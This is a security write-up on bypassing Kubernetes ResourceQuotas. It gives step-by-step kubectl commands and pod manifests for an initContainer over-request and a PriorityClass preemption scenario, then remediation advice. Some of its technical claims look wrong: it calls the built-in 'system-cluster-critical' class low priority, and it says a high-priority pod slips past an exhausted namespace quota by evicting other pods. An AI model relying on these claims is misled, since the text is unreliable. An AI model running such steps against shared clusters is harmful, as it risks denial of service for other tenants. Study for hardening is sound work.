
# Kubernetes Resource Quota Bypass Vulnerabilities

## 1. Overview

This document details techniques for bypassing Kubernetes Resource Quotas. Resource Quotas are designed to limit the aggregate resource consumption of a namespace. An attacker who can circumvent these quotas can exhaust cluster resources, leading to denial-of-service (DoS), privilege escalation (potentially if resources like privileged pods can be created and used), and compromise of other applications sharing the cluster.

### Attack Vector Description

An attacker can bypass resource quotas by:

*   **Exploiting Pod PriorityClass interaction:** Setting a high priority class on a pod can preempt other pods, potentially allowing a user to consume more resources than their quota should allow when eviction occurs and creates room for higher priority pods. While not strictly bypassing the quota *during initial deployment*, it bypasses the intended constraints by indirectly controlling resource allocation.
*   **Leveraging `initContainers` without proper quota enforcement:**  `initContainers` are containers that run before the main application containers in a pod.  If quota enforcement is incorrectly configured or designed, `initContainers` might not be properly accounted for when resource quotas are evaluated. An attacker can request resources for an `initContainer` exceeding allowed limits, potentially allowing the pod to be created even when the main containers alone would violate the quota.
*   **Exploiting immutable fields in mutating webhooks:**  Resource quotas are not dynamically updated if an immutable field (e.g., container resource limits) is changed post-admission via a mutating webhook. An attacker, with sufficient permissions to create webhooks that can mutate existing Pods, could increase the resource usage of a Pod beyond the original quota.
*   **Exploiting Namespace-Scoped Operators without RBAC controls:** Some Kubernetes operators create resources in the same namespace as the operator, using the operator's service account credentials.  If the operator's service account is not correctly limited by ResourceQuotas, it could potentially deploy resources that exceed the intended quotas for other users/workloads within that namespace.
*   **Direct API Manipulation (Requires elevated privileges):** If an attacker gains access to the Kubernetes API server (e.g., through a compromised service account or node), they might be able to directly manipulate resource quota objects, disabling or modifying them. This requires significantly elevated privileges and is a more targeted attack.

### Potential Impact and Consequences

*   **Denial of Service (DoS):**  Exhausting cluster resources makes it impossible for legitimate applications to run.
*   **Privilege Escalation:** Using excessive resources, an attacker might be able to deploy privileged pods or exploit other vulnerabilities that require significant resources.
*   **Data Exfiltration:** Compromised pods with high resource usage might be able to exfiltrate data from other pods or the cluster itself.
*   **Cost Overruns:** For cloud-based Kubernetes clusters, exceeding resource limits can lead to unexpected and significant cost increases.
*   **Resource Starvation:** Legitimate applications might be starved of resources, leading to performance degradation or failure.

### Risk Level Assessment

**High**.  Successful bypass of resource quotas can have severe consequences, including DoS, privilege escalation, and cost overruns.

### Technical Explanation

Resource quotas are enforced by the Kubernetes API server during resource creation and update.  The API server checks the requested resources against the quota limits defined for the namespace.  Vulnerabilities arise when this enforcement is incomplete, incorrectly configured, or can be manipulated after the initial resource creation.  Misconfigurations in quota definitions, RBAC, or the use of `initContainers` and webhooks can all lead to bypass opportunities. The interaction of pod priority can bypass resource usage indirectly, but the initial deployment is compliant.

### Prerequisites and Conditions Needed

*   **Access to a Kubernetes cluster:**  Requires either local access to the cluster, or remote access through `kubectl` configured with valid credentials.
*   **Namespace with ResourceQuota configured:**  A namespace must exist with resource quotas already in place.
*   **Permissions to create resources in the target namespace:** The attacker needs permissions to create pods, deployments, or other resources that consume quota resources.
*   **Understanding of Kubernetes RBAC:**  Knowledge of RBAC is crucial for understanding which actions are permitted and for exploiting misconfigurations.
*   **(Optional) Permissions to create mutating webhooks:** For exploiting immutable fields, the attacker needs privileges to create mutating webhooks that can alter existing pods.
*   **(Optional) Permissions to manipulate cluster-scoped resources:** For direct manipulation of quota objects, the attacker needs elevated privileges.

## 2. Validation and Exploitation Steps

This section outlines steps to validate and exploit resource quota bypass techniques. We will focus on `initContainers` and PriorityClass interactions as examples.

**Scenario 1: Exploiting InitContainers**

Assume we have a namespace `test-namespace` with a resource quota `test-quota` defined that limits memory and CPU requests/limits for pods.

```yaml
# test-quota.yaml
apiVersion: v1
kind: ResourceQuota
metadata:
  name: test-quota
spec:
  hard:
    requests.cpu: "2"
    requests.memory: "2Gi"
    limits.cpu: "4"
    limits.memory: "4Gi"
```

```bash
kubectl create namespace test-namespace
kubectl apply -n test-namespace -f test-quota.yaml

```

**Step 1: Validation - Deploying a standard pod within the quota**

```bash
kubectl apply -n test-namespace -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: normal-pod
spec:
  containers:
  - name: main-container
    image: nginx:latest
    resources:
      requests:
        cpu: "1"
        memory: "1Gi"
      limits:
        cpu: "2"
        memory: "2Gi"
EOF
```

*   **Explanation:** Creates a basic pod within the defined resource limits.
*   **Expected Output:** Pod should be created successfully.
*   **Validation:** Confirms the resource quota is functioning correctly.

**Step 2: Validation - Deploying a pod exceeding the quota**

```bash
kubectl apply -n test-namespace -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: exceeding-pod
spec:
  containers:
  - name: main-container
    image: nginx:latest
    resources:
      requests:
        cpu: "3"
        memory: "3Gi"
      limits:
        cpu: "5"
        memory: "5Gi"
EOF
```

*   **Explanation:** Attempts to create a pod that requests more CPU and memory than the defined quota allows.
*   **Expected Output:** The pod creation should fail with an error message indicating that the resource quota is exceeded.
*   **Validation:**  Further confirms the resource quota is functioning correctly and preventing deployments exceeding the defined limits. Look for an error message like: "exceeded quota: test-quota, requested: requests.cpu=3,requests.memory=3Gi, used: requests.cpu=1,requests.memory=1Gi, limited: requests.cpu=2,requests.memory=2Gi".

**Step 3: Exploitation - Deploying a pod with an `initContainer` exceeding the quota**

```bash
kubectl apply -n test-namespace -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: init-container-exploit
spec:
  initContainers:
  - name: init-exceeds-limits
    image: busybox:latest
    command: ["sh", "-c", "sleep 5"] # Simple command to hold resource
    resources:
      requests:
        cpu: "3"
        memory: "3Gi"
      limits:
        cpu: "5"
        memory: "5Gi"
  containers:
  - name: main-container
    image: nginx:latest
    resources:
      requests:
        cpu: "1"
        memory: "1Gi"
      limits:
        cpu: "2"
        memory: "2Gi"
EOF
```

*   **Explanation:** This creates a pod with an `initContainer` that requests significantly more resources than the resource quota allows, while the main container stays within quota.  The key is to see if the *combined* resources are checked *before* the pod is admitted.  In some older Kubernetes versions, incorrect quota calculation can allow this to succeed. This might require adjustments based on the container runtime and cgroup configurations. Note: This is a race condition.
*   **Expected Output:** Ideally, the pod creation *should* fail due to resource quota violation, but in vulnerable configurations (older Kubernetes versions), the pod might be created. If the pod is created, observe its state with `kubectl describe pod init-container-exploit -n test-namespace`. Check for any resource-related errors or events. Also check resource quota usage using `kubectl describe resourcequota test-quota -n test-namespace`.
*   **Exploitation/Validation:** If the pod is created, this indicates a resource quota bypass vulnerability. This often happens when the resource usage of `initContainers` is not properly accounted for when applying the resource quota. Note that newer versions of Kubernetes have improved resource quota enforcement, reducing the likelihood of this exploit succeeding.  Try different images for `initContainer` if busybox does not allocate the resources as expected.

**Step 4: (If Step 3 Fails) Variation: Smaller initContainer Request**
Try reducing the `initContainer` resource request slowly until the Pod is created.  The exact value will depend on other pods deployed in the namespace.  The goal is to have the *sum* of `initContainer` + `mainContainer` exceed the quota.

```bash
kubectl apply -n test-namespace -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: init-container-exploit
spec:
  initContainers:
  - name: init-exceeds-limits
    image: busybox:latest
    command: ["sh", "-c", "sleep 5"] # Simple command to hold resource
    resources:
      requests:
        cpu: "1.5"
        memory: "1.5Gi"
      limits:
        cpu: "3"
        memory: "3Gi"
  containers:
  - name: main-container
    image: nginx:latest
    resources:
      requests:
        cpu: "1"
        memory: "1Gi"
      limits:
        cpu: "2"
        memory: "2Gi"
EOF
```

*   **Explanation:** Narrows the difference between the resource usage and quota.
*   **Expected Outcome:** Pod gets created successfully.

**Scenario 2: Exploiting Pod PriorityClass interaction**

First, create a `PriorityClass` with a higher priority.

```yaml
# high-priority-class.yaml
apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: high-priority
value: 1000000
globalDefault: false
description: "This priority class should be used for high priority pods only."
```

```bash
kubectl apply -f high-priority-class.yaml
```

**Step 5: Validation - Deploying a low-priority pod that uses the quota**
Assume there are no pods deployed and the quota is fully available.

```bash
kubectl apply -n test-namespace -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: low-priority-pod
spec:
  priorityClassName: system-cluster-critical # Or another low-priority or default priority
  containers:
  - name: main-container
    image: nginx:latest
    resources:
      requests:
        cpu: "2"
        memory: "2Gi"
      limits:
        cpu: "4"
        memory: "4Gi"
EOF
```

*   **Explanation:**  Deploys a pod that uses the entire resource quota.  Using `system-cluster-critical` gives a default lower priority, but also exists by default. Replace `system-cluster-critical` if it's not present.
*   **Expected Outcome:**  Pod is deployed successfully, using all of the quota resources.

**Step 6: Exploitation - Deploying a high-priority pod**

```bash
kubectl apply -n test-namespace -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: high-priority-pod
spec:
  priorityClassName: high-priority
  containers:
  - name: main-container
    image: nginx:latest
    resources:
      requests:
        cpu: "2"
        memory: "2Gi"
      limits:
        cpu: "4"
        memory: "4Gi"
EOF
```

*   **Explanation:** This deploys a high-priority pod. Because the namespace quota is exhausted, the scheduler must evict lower-priority pods to make room for the new high-priority pod. This indirectly "bypasses" the intended quota by preempting existing pods.  The quota still *exists*, but its *effects* are diminished for the high-priority workload.
*   **Expected Outcome:** The `high-priority-pod` should be created.  The `low-priority-pod` will be evicted to accommodate it. Use `kubectl get pods -n test-namespace` to see the status of both pods.  You will likely see the `low-priority-pod` in a terminating or evicted state.
*   **Exploitation/Validation:** The successful creation of the `high-priority-pod` and eviction of the `low-priority-pod` demonstrates how pod priority can circumvent the intended resource allocation enforced by the resource quota. While technically not bypassing the *initial deployment check*, the behavior bypasses the intended goal of resource limitation. This is a more subtle form of resource exhaustion.

### Remediation Recommendations

*   **Upgrade Kubernetes:**  Ensure that you are running the latest stable version of Kubernetes, as many resource quota vulnerabilities have been addressed in recent releases.
*   **Properly configure `initContainers`:**  Thoroughly evaluate resource requirements for `initContainers` and ensure that they are correctly accounted for in resource quota calculations. Regularly audit your deployments.
*   **Implement Mutating Webhook Admission Control Carefully:** If using mutating webhooks, ensure that they cannot modify resource limits after pod admission. Add checks and validations to prevent such modifications. Ensure you audit webhook modifications.
*   **Robust RBAC Configuration:** Implement strict RBAC policies to limit who can create and modify resources, especially webhooks and resource quotas.  Principle of Least Privilege should always be applied.
*   **Regularly Audit Resource Quotas:**  Periodically review resource quota configurations to ensure they are appropriate and effective. Monitor quota usage to detect potential misuse.
*   **Limit Pod Priority Usage:** Carefully control the use of Pod Priority. Ensure that only authorized users can create pods with high priority and that the use of priority is justified.
*   **Resource Usage Monitoring:**  Implement comprehensive resource usage monitoring to detect anomalies and potential abuse of resources.  Set up alerts for unexpected resource consumption.
*   **Operator Controls:** If using operators, rigorously control the RBAC of the operators' service accounts, ensuring that they are constrained by ResourceQuotas or other similar policies that limit resource usage within namespaces. Implement regular auditing of operator actions.
